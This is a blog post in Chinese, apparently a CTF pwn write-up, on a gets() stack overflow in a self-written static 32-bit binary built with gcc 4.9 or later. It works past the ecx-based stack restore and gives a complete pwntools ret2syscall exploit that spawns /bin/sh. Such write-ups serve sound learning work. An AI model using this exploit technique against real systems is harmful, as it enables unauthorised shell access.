@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>Buffer Overflow with gcc&gt;=4.9 | AssassinQ</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="ctfpwn">
+  
+  
+  
+  
+  <meta name="description" content="gcc的版本如果大于4.9，main函数下的缓冲区溢出会有不一样的check，即使没开canary，也不能溢出。">
+<meta name="keywords" content="ctf,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Buffer Overflow with gcc&gt;=4.9">
+<meta property="og:url" content="https://qianfei11.github.io/2019/03/17/Buffer-Overflow-with-gcc-4-9/index.html">
+<meta property="og:site_name" content="AssassinQ">
+<meta property="og:description" content="gcc的版本如果大于4.9，main函数下的缓冲区溢出会有不一样的check，即使没开canary，也不能溢出。">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-03-18T12:57:46.111Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Buffer Overflow with gcc&gt;=4.9">
+<meta name="twitter:description" content="gcc的版本如果大于4.9，main函数下的缓冲区溢出会有不一样的check，即使没开canary，也不能溢出。">
+  
+    <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
+  
+  <link rel="icon" href="/css/images/favicon.ico">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+    
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css">
+  <link rel="stylesheet" href="/css/fashion.css">
+  <link rel="stylesheet" href="/css/glyphs.css">
+
+</head>
+</html>
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+
+
+<header id="allheader" class="site-header" role="banner">
+  <div class="clearfix container">
+      <div class="site-branding">
+
+          <h1 class="site-title">
+            
+              <a href="/" title="AssassinQ" rel="home"> AssassinQ </a>
+            
+          </h1>
+          
+          
+            <div class="site-description">ZJGSU-IS-17</div>
+          
+            
+          <nav id="main-navigation" class="main-navigation" role="navigation">
+            <a class="nav-open">Menu</a>
+            <a class="nav-close">Close</a>
+
+            <div class="clearfix sf-menu">
+              <ul id="main-nav" class="menu sf-js-enabled sf-arrows" style="touch-action: pan-y;">
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/">Home</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/archives">Archives</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/tags">Tags</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/about">About</a> </li>
+                    
+              </ul>
+            </div>
+          </nav>
+
+      </div>
+  </div>
+</header>
+
+
+  <div id="container">
+    <div id="wrap">
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-Buffer-Overflow-with-gcc-4-9" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost">
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      Buffer Overflow with gcc&gt;=4.9
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2019/03/17/Buffer-Overflow-with-gcc-4-9/" class="article-date">
+	  <time datetime="2019-03-17T09:43:52.000Z" itemprop="datePublished">March 17, 2019</time>
+	</a>
+
+       
+      
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>gcc的版本如果大于4.9，main函数下的缓冲区溢出会有不一样的check，即使没开canary，也不能溢出。</p>
+<a id="more"></a>
+<h1 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h1><p>自己写的一道题目，源码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc p3.c -o p3 -m32 -static -fno-stack-protector -g</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">200</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"say something: "</span>);</span><br><span class="line">    gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><p>乍一看是静态编译，然后又是gets，一定是很容易的栈溢出，但是大于4.9版本的gcc是不太一样的。main函数中是这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0804887c &lt;main&gt;:</span><br><span class="line"> 804887c:       8d 4c 24 04             lea    ecx,[esp+0x4]</span><br><span class="line"> 8048880:       83 e4 f0                and    esp,0xfffffff0</span><br><span class="line"> 8048883:       ff 71 fc                push   DWORD PTR [ecx-0x4]</span><br><span class="line"> 8048886:       55                      push   ebp</span><br><span class="line"> 8048887:       89 e5                   mov    ebp,esp</span><br><span class="line"> 8048889:       51                      push   ecx</span><br><span class="line"> 804888a:       81 ec d4 00 00 00       sub    esp,0xd4</span><br><span class="line"> ......</span><br><span class="line"> 80488eb:       83 c4 10                add    esp,0x10</span><br><span class="line"> 80488ee:       b8 00 00 00 00          mov    eax,0x0</span><br><span class="line"> 80488f3:       8b 4d fc                mov    ecx,DWORD PTR [ebp-0x4]</span><br><span class="line"> 80488f6:       c9                      leave  </span><br><span class="line"> 80488f7:       8d 61 fc                lea    esp,[ecx-0x4]</span><br><span class="line"> 80488fa:       c3                      ret</span><br></pre></td></tr></table></figure>
+<p>这里我们可以看到，程序在对栈的保存上，额外使用了ecx来保存栈上的某个值。当我们尝试栈溢出的时候，会覆盖到ecx上，导致最后恢复的栈值不存在。通过gdb调试我们可以看得更清楚：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────────────────────────────── Registers ──────────────────────────────────────────────────────────────────</span><br><span class="line">EAX: 0x804887c (&lt;main&gt;:	lea    ecx,[esp+0x4])</span><br><span class="line">EBX: 0x80481a8 (&lt;_init&gt;:	push   ebx)</span><br><span class="line">ECX: 0xffffcd90 --&gt; 0x1 </span><br><span class="line">EDX: 0xffffcdb4 --&gt; 0x80481a8 (&lt;_init&gt;:	push   ebx)</span><br><span class="line">ESI: 0x80ea00c --&gt; 0x8067020 (&lt;__strcpy_sse2&gt;:	mov    edx,DWORD PTR [esp+0x4])</span><br><span class="line">EDI: 0x0 </span><br><span class="line">EBP: 0xffffcd78 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffcc94 --&gt; 0x2c0003f </span><br><span class="line">EIP: 0x8048893 (&lt;main+23&gt;:	push   0x80bb288)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">───────────────────────────────────────────────────────────────────── Code ────────────────────────────────────────────────────────────────────</span><br><span class="line">   0x8048889 &lt;main+13&gt;:	push   ecx</span><br><span class="line">   0x804888a &lt;main+14&gt;:	sub    esp,0xd4</span><br><span class="line">   0x8048890 &lt;main+20&gt;:	sub    esp,0xc</span><br><span class="line">=&gt; 0x8048893 &lt;main+23&gt;:	push   0x80bb288</span><br><span class="line">   0x8048898 &lt;main+28&gt;:	call   0x804ed60 &lt;printf&gt;</span><br><span class="line">   0x804889d &lt;main+33&gt;:	add    esp,0x10</span><br><span class="line">   0x80488a0 &lt;main+36&gt;:	sub    esp,0xc</span><br><span class="line">   0x80488a3 &lt;main+39&gt;:	lea    eax,[ebp-0xd0]</span><br><span class="line">──────────────────────────────────────────────────────────────────── Stack ────────────────────────────────────────────────────────────────────</span><br><span class="line">0000| 0xffffcc94 --&gt; 0x2c0003f </span><br><span class="line">0004| 0xffffcc98 --&gt; 0xfff </span><br><span class="line">0008| 0xffffcc9c --&gt; 0x0 </span><br><span class="line">0012| 0xffffcca0 --&gt; 0x0 </span><br><span class="line">0016| 0xffffcca4 --&gt; 0x5b (&apos;[&apos;)</span><br><span class="line">0020| 0xffffcca8 --&gt; 0x0 </span><br><span class="line">0024| 0xffffccac --&gt; 0xf0b5ff </span><br><span class="line">0028| 0xffffccb0 --&gt; 0xffffccee --&gt; 0xe6ce0000 </span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">Legend: code, data, rodata, heap, value</span><br><span class="line">0x08048893	7		printf(&quot;say something: &quot;);</span><br><span class="line">assassinq&gt;&gt; p $ecx</span><br><span class="line">$1 = 0xffffcd90</span><br><span class="line">......</span><br><span class="line">────────────────────────────────────────────────────────────────── Registers ──────────────────────────────────────────────────────────────────</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0x80481a8 (&lt;_init&gt;:	push   ebx)</span><br><span class="line">ECX: 0x42424242 (&apos;BBBB&apos;)</span><br><span class="line">EDX: 0x80eb4e0 --&gt; 0x0 </span><br><span class="line">ESI: 0x80ea00c --&gt; 0x8067020 (&lt;__strcpy_sse2&gt;:	mov    edx,DWORD PTR [esp+0x4])</span><br><span class="line">EDI: 0x0 </span><br><span class="line">EBP: 0xffffcd78 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffcca0 --&gt; 0x0 </span><br><span class="line">EIP: 0x80488ba (&lt;main+62&gt;:	leave)</span><br><span class="line">EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">───────────────────────────────────────────────────────────────────── Code ────────────────────────────────────────────────────────────────────</span><br><span class="line">   0x80488af &lt;main+51&gt;:	add    esp,0x10</span><br><span class="line">   0x80488b2 &lt;main+54&gt;:	mov    eax,0x0</span><br><span class="line">   0x80488b7 &lt;main+59&gt;:	mov    ecx,DWORD PTR [ebp-0x4]</span><br><span class="line">=&gt; 0x80488ba &lt;main+62&gt;:	leave  </span><br><span class="line">   0x80488bb &lt;main+63&gt;:	lea    esp,[ecx-0x4]</span><br><span class="line">   0x80488be &lt;main+66&gt;:	ret    </span><br><span class="line">   0x80488bf:	nop</span><br><span class="line">   0x80488c0 &lt;generic_start_main&gt;:	push   esi</span><br><span class="line">──────────────────────────────────────────────────────────────────── Stack ────────────────────────────────────────────────────────────────────</span><br><span class="line">0000| 0xffffcca0 --&gt; 0x0 </span><br><span class="line">0004| 0xffffcca4 --&gt; 0x5b (&apos;[&apos;)</span><br><span class="line">0008| 0xffffcca8 (&apos;A&apos; &lt;repeats 200 times&gt;...)</span><br><span class="line">0012| 0xffffccac (&apos;A&apos; &lt;repeats 200 times&gt;...)</span><br><span class="line">0016| 0xffffccb0 (&apos;A&apos; &lt;repeats 196 times&gt;, &quot;BBBB&quot;)</span><br><span class="line">0020| 0xffffccb4 (&apos;A&apos; &lt;repeats 192 times&gt;, &quot;BBBB&quot;)</span><br><span class="line">0024| 0xffffccb8 (&apos;A&apos; &lt;repeats 188 times&gt;, &quot;BBBB&quot;)</span><br><span class="line">0028| 0xffffccbc (&apos;A&apos; &lt;repeats 184 times&gt;, &quot;BBBB&quot;)</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">Legend: code, data, rodata, heap, value</span><br><span class="line">0x080488ba	10	&#125;</span><br><span class="line">assassinq&gt;&gt; p $ecx</span><br><span class="line">$2 = 0x42424242</span><br></pre></td></tr></table></figure>
+<p>显然ecx的作用是使得esp恢复到原来的值，那么如果我们破坏了esp，那么会造成奇怪的影响。既然ecx无法覆盖，那么我们就需要想办法绕过它。在上面调试的过程中，我们发现ecx的最低两个字节是0x90，如果我们把它改成00，那么我们的栈就会往下掉0x90个字节，我们输入的buf就能有用武之地。由于这里输入使用的是gets，采用的是0x00截断我们的输入，我们可以充分利用这个特点，达到我们的目的。</p>
+<p>这个程序是静态编译的，可以使用ret2syscall。我们把rop填在buf的最后面，前面则填满一个ret的gadget，这样的话只要ecx保存的地址低两位大于我们rop的长度，就有概率成功打通。</p>
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">'./p3'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'10.21.13.69'</span>, <span class="number">10016</span>)</span><br><span class="line">elf = ELF(<span class="string">'./p3'</span>)</span><br><span class="line">g = <span class="keyword">lambda</span> x: next(elf.search(asm(x)))</span><br><span class="line">ret = g(<span class="string">'ret'</span>)</span><br><span class="line">info(<span class="string">'ret = '</span> + hex(ret))</span><br><span class="line">pop_eax_ret = g(<span class="string">'pop eax ; ret'</span>)</span><br><span class="line">pop_ebx_ret = g(<span class="string">'pop ebx ; ret'</span>)</span><br><span class="line">pop_ecx_ret = g(<span class="string">'pop ecx ; ret'</span>)</span><br><span class="line">pop_edx_ret = g(<span class="string">'pop edx ; ret'</span>)</span><br><span class="line">int_0x80_ret = g(<span class="string">'int 0x80 ; ret'</span>) </span><br><span class="line">buf = <span class="number">0x080eb000</span> - <span class="number">100</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">offset = <span class="number">204</span></span><br><span class="line"><span class="comment"># read(0, '/bin/sh\x00', 100)</span></span><br><span class="line">rop1 = [</span><br><span class="line">	pop_eax_ret, </span><br><span class="line">	<span class="number">3</span>, </span><br><span class="line">	pop_ebx_ret, </span><br><span class="line">	<span class="number">0</span>, </span><br><span class="line">	pop_ecx_ret, </span><br><span class="line">	buf, </span><br><span class="line">	pop_edx_ret, </span><br><span class="line">	<span class="number">100</span>, </span><br><span class="line">	int_0x80_ret, </span><br><span class="line">]</span><br><span class="line"><span class="comment"># execve('/bin/sh\x00', 0, 0)</span></span><br><span class="line">rop2 = [</span><br><span class="line">	pop_eax_ret, </span><br><span class="line">	<span class="number">0xb</span>, </span><br><span class="line">	pop_ebx_ret, </span><br><span class="line">	buf, </span><br><span class="line">	pop_ecx_ret, </span><br><span class="line">	<span class="number">0</span>, </span><br><span class="line">	pop_edx_ret, </span><br><span class="line">	<span class="number">0</span>, </span><br><span class="line">	int_0x80_ret</span><br><span class="line">]</span><br><span class="line">rop = <span class="string">''</span>.join(map(p32, rop1 + rop2))</span><br><span class="line">info(<span class="string">'len(rop) = '</span> + str(len(rop)))</span><br><span class="line">offset2 = offset - len(rop)</span><br><span class="line">info(<span class="string">'offset2 = '</span> + str(offset2))</span><br><span class="line">payload = p32(ret) * (offset2 / <span class="number">4</span>) + rop</span><br><span class="line">info(<span class="string">'len(payload) = '</span> + str(len(payload)))</span><br><span class="line"><span class="comment"># payload = cyclic(500)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.youtube.com/watch?v=9bHibgrjNlc" target="_blank" rel="noopener">【ctf-pwn】【winesap】STCS 2016 Week4</a></p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+
+      
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+
+      
+    </footer>
+    <hr class="entry-footer-hr">
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/03/19/Gets一把梭/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Gets一把梭
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/03/16/Got-Hijacking-and-Stack-Migration/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Got Hijacking and Stack Migration</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Source"><span class="nav-number">1.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Analysis"><span class="nav-number">2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploit"><span class="nav-number">3.</span> <span class="nav-text">Exploit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">4.</span> <span class="nav-text">Reference</span></a></li></ol>
+    
+    </div>
+  </aside>
+</section>
+        
+      </div>
+
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav> -->
+    <footer id="footer" class="site-footer">
+  
+
+  <div class="clearfix container">
+      <div class="site-info">
+	      &copy; 2019 AssassinQ All Rights Reserved.
+        
+      </div>
+      <div class="site-credit">
+        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
+      </div>
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+
+
+    <!-- headerblur min height -->
+    
+    
+</script>
+    
+<div style="display: none;">
+  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+</div>
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+<script src="/js/bootstrap.js"></script>
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+
+  <div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+  </div>
+
+
+
+
+
+
+
+
+  </div>
+
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js" async=""></script>
+</body>
+</html>
